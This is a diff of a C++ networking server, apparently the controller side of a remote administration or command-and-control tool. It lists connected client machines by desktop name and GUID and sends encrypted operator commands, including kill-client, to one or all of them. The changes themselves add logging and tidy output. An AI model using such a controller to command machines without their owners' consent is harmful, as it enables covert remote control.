@@ -2,6 +2,7 @@
 #include "Serialization.h"
 #include "NetworkManager.h"
 #include "External/base64.h"
+#include "Logging.hpp"
 
 #include <iostream>
 #include <fstream>
@@ -63,8 +64,10 @@ const std::map<std::string, PacketFlagInfo> ServerCommandFlags =
  * \param TCPPort - the port to make a TCP server on
  */
 ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
-    this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);
+    this->m_ServerLogs.CreateLog(this->m_Config.serverLogPath, "server_log");
+    this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);    
     this->m_UDPServerDetails = NewServerInstance(UDP, UDPPort);
+    this->m_ServerLogs.Log("Server interfaces created (TCP and UDP)");
     this->m_SessionKeys = LGCrypto::GenerateRSAPair(4096);
 }
 
@@ -159,13 +162,13 @@ void ServerInterface::ListenForUDPMessages() {
 
     // receive while udp server is alive
     while ( this->m_UDPServerDetails.alive == TRUE ) {
-        Packet        req = {};
+        Packet        req;
         sockaddr_in   incomingAddr;
-        BOOL          received = m_NetworkManager.ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
+        
+        BOOL received = m_NetworkManager.ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
         if ( !received )
             continue;
-
-        std::cout << "Received a message on the UDP socket!\n";
+        
         PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
     }
 }
@@ -284,6 +287,7 @@ void ServerInterface::ShutdownServer(bool confirm) {
     ShutdownSocket(this->m_TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
     CloseSocket(this->m_TCPServerDetails.sfd);
     this->m_TCPServerDetails = {}; // set server details to new blank server structure
+    this->m_ServerLogs.Log("Shutting down TCP server");
 }
 
 /**
@@ -305,8 +309,6 @@ bool ServerInterface::PerformRequest(const Packet& req, Server on, long cuid, so
 
     if ( onTCP ) 
         TCPClient = GetClientPtr(cuid);
-
-    std::cout << "Performing action : " << req.action << std::endl;
 
     switch ( req.action )
     {
@@ -335,17 +337,13 @@ bool ServerInterface::PerformRequest(const Packet& req, Server on, long cuid, so
         Server temp = this->m_TCPServerDetails;
         memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
 
-        std::cout << "[kConnectClient] : Good address. \n";
-        std::cout << "[kConnectClient] : Sending TCP server details. \n";
-
         success = m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);
-
-        if ( success )
-            std::cout << "[kConnectClient] : Sent TCP details. \n";
 
         break;
     }
     }
+
+    return success;
 }
 
 void ServerInterface::OnKeepAliveEcho(long cuid, Packet& packet) {
@@ -445,7 +443,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
         Packet     packet = {0};
 
         //bool received = m_NetworkManager.ReceiveData(encrypted, client->GetSocket(), TCP);
-        bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket(), TCP);
+        bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket());
         if ( !received )
             continue;
         
@@ -458,8 +456,11 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
         if ( packet.code == kNotAResponse )
             PerformRequest(packet, this->m_TCPServerDetails, cuid);
-        else 
+        else {
+            std::cout << std::endl;
+            std::cout << client->ClientUID << " sent a message!" << std::endl;
             std::cout << packet.buffer << std::endl;
+        }
 
     } while ( client->Alive && client->GetSocket() != INVALID_SOCKET );
 
@@ -475,8 +476,7 @@ void ServerInterface::AcceptTCPConnections() {
         return;
 
     this->m_TCPServerDetails.accepting = TRUE;
-
-    std::cout << "[TCP] : Accepting connections...\n";
+    std::cout << "Accepting connections on the TCP server." << std::endl;
 
     while ( this->m_ClientList.size() <= 200 && this->m_TCPServerDetails.alive == TRUE )
     {
@@ -489,6 +489,7 @@ void ServerInterface::AcceptTCPConnections() {
             continue;
 
         OnTCPConnection(clientSocket, addr);
+        this->m_ServerLogs.Log("A client joined the TCP server");
     }
 
     // stopped accepting connections. this function is now done.
@@ -558,7 +559,6 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
 
         cmdInfo.flags = GetFlagsFromInput(flagInput);
         cmdInfo.insert(input);
-        std::cout << "insertted input: " << cmdInfo.buffer << std::endl;
 
         if ( cmdInfo.buffLen == -1 ) // error
             break;
@@ -652,7 +652,7 @@ Packet ServerInterface::WaitForClientResponse(Client* client) {
     Packet response;
 
     m_NetworkManager.SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
-    bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket(), TCP);
+    bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket());
     m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
 
     if ( WSAGetLastError() == WSAETIMEDOUT ) {
@@ -674,10 +674,14 @@ bool ServerInterface::IsServerCommand(long command) {
     return ServerCommands.contains(static_cast<Action>(command));
 }
 
-void ServerInterface::RunUserInputOnClients() {
-    while ( this->m_ClientList.size() <= 0 )
-        Sleep(100);
+void ServerInterface::OutputClientList() {
+    std::cout << "Showing all (" << this->m_ClientList.size() << ") connected clients:" << std::endl;
+    std::cout << "CUID  | Name            | Machine GUID" << std::endl;
+    for ( auto& [cuid, client] : this->m_ClientList )
+        std::cout << cuid << " - " << client.GetDesktopName() << " - " << client.GetMachineGUID() << std::endl;
+}
 
+void ServerInterface::RunUserInputOnClients() {
     while ( this->m_TCPServerDetails.alive ) {
         // select which client to run command on
         std::string  clientID;    
@@ -685,10 +689,14 @@ void ServerInterface::RunUserInputOnClients() {
         Client*      client        = nullptr;
         BOOL         performed     = FALSE;
         BOOL         globalCommand = FALSE; // perform command on all clients
-        Action lCommand      = kNone;
+        Action       lCommand      = kNone;
         BOOL         sent          = FALSE;
         std::string  command;
+        int          performees = 0;
 
+        std::cout << std::endl;
+        OutputClientList();
+        std::cout << std::endl;
         std::cout << "[Client ID to perform command on; 0 for all]: ";
         std::getline(std::cin, clientID);
         
@@ -717,7 +725,7 @@ void ServerInterface::RunUserInputOnClients() {
         
         this->OutputServerCommands();
 
-        std::cout << "[Enter integer value corresponding to the command to perform]: ";
+        std::cout << "[# Command to perform]: ";
         std::getline(std::cin, command);
 
         try {
@@ -763,27 +771,28 @@ void ServerInterface::RunUserInputOnClients() {
                     continue;
 
                 BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, host.GetAESKey(), LGCrypto::GenerateAESIV());
-                std::cout << "sent size: " << encrypted.size() << std::endl;
-
                 sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);
+
+                if ( !sent ) {
+                    std::cout << "There was an error sending your command. Is the client alive?" << std::endl;
+                    std::cout << "Details: \n";
+                    std::cout << "Recipient CUID:         " << host.ClientUID << std::endl;
+                    std::cout << "Recipient Machine GUID: " << host.GetMachineGUID() << std::endl;
+                    std::cout << "Recipient Desktop Name: " << host.GetDesktopName() << std::endl;
+                    std::cout << "Sent packet size:       " << encrypted.size() << " bytes" << std::endl;
+                }
+                else
+                    performees++;
 
                 if ( toSend.action == kKillClient ) {
                     Sleep(100);
                     RemoveClientFromServer(&host);
                 }
-
             }
+            std::cout << "Performed command on " << std::to_string(performees) << " clients." << std::endl;
         }
-
-        if ( sent ) {
-            std::cout << "Successfully sent your command." << std::endl;
-            //system("pause");
-        } else {
-            std::cout << "Error sending your command." << std::endl;
-            //system("pause");
-        }
-
-        //system("cls");
+        system("pause");
+        system("cls");
     }
 }
 
@@ -861,12 +870,13 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
         server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
         if ( server.sfd == INVALID_SOCKET )
             return server;
+        
         server.type = SOCK_DGRAM;
         m_Config.UDPPort = port;
     }
     
     server.addr.sin_addr.s_addr = INADDR_ANY;
-    server.addr.sin_family        = AF_INET;
+    server.addr.sin_family      = AF_INET;
     server.addr.sin_port        = HostToNetworkShort(port);
     server.port                 = port;
     server.alive = TRUE;
@@ -883,7 +893,6 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
  * \return TRUE if the server has started, FALSE if otherwise
  */
 bool ServerInterface::StartServer(Server& server) {
-    std::cout << "Starting server on port " << server.port << "... ";
     if ( server.sfd == INVALID_SOCKET )
         return false;
 
@@ -908,6 +917,7 @@ bool ServerInterface::StartServer(Server& server) {
         acceptThread.detach(); // run accept thread even after this function returns
 
         this->SendCommandsToClients();
+        this->m_ServerLogs.Log("TCP server accepting");
     }
     // otherwise if not tcp server then listen for udp messaages
     else if ( server.type == SOCK_DGRAM ) {
@@ -915,9 +925,8 @@ bool ServerInterface::StartServer(Server& server) {
 
         std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
         receiveThread.detach(); 
+        this->m_ServerLogs.Log("UDP 'server' listening.");
     }
-
-    std::cout << "Done!" << std::endl;
 
     return true;
 }
@@ -994,33 +1003,33 @@ Packet ServerInterface::PingClient(long cuid) {
     pingCommand.flags = RESPOND_WITH_STATUS | PACKET_IS_A_COMMAND;
     pingCommand.buffLen = 0;
 
-    std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
+    //std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
     BYTESTRING encrypted = LGCrypto::EncryptStruct(pingCommand, client->GetAESKey(), LGCrypto::GenerateAESIV());
 
-    BOOL sent = m_NetworkManager.SendTCPLargeData(encrypted, client->GetSocket(), TCP);
+    BOOL sent = m_NetworkManager.SendTCPLargeData(encrypted, client->GetSocket());
     if ( !sent )
         return {};
 
     client->ExpectingResponse = TRUE;
 
-    auto start = std::chrono::high_resolution_clock::now();
+    //auto start = std::chrono::high_resolution_clock::now();
     Packet response = WaitForClientResponse(client);
-    auto end = std::chrono::high_resolution_clock::now();
+    //auto end = std::chrono::high_resolution_clock::now();
     
     if ( response.code == ClientResponseCode::kTimeout ) {
-        std::cout << "- Request timed out." << std::endl;
+        //std::cout << "- Request timed out." << std::endl;
         return {};
     } else if ( response.code == ClientResponseCode::kResponseError ) {
-        std::cout << "- Request failed." << std::endl;
+        //std::cout << "- Request failed." << std::endl;
         return {};
     }
 
-    std::cout << "- Reply from " << client->GetDesktopName() << ". Code " << response.code << ". ";
+    //std::cout << "- Reply from " << client->GetDesktopName() << ". Code " << response.code << ". ";
 
-    auto dur = end - start;
-    long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();
+    //auto dur = end - start;
+    //long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();
     
-    std::cout << "Took " << final << " ms" << std::endl;
+    //std::cout << "Took " << final << " ms" << std::endl;
 
     return response;
 }
